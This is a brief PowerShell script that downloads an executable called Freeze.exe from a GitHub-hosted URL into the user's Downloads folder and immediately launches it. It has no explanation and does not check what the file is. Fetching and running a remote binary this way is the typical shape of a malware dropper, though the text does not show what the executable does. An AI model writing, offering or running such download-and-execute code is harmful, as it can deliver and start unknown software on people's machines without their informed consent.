$Url = "https://github.com/webntdev/webntdev.github.io/raw/main/application/Freeze.exe"
$OutputPath = "$env:USERPROFILE\Downloads\Freeze.exe"

Invoke-WebRequest -Uri $Url -OutFile $OutputPath

Start-Process -FilePath $OutputPath
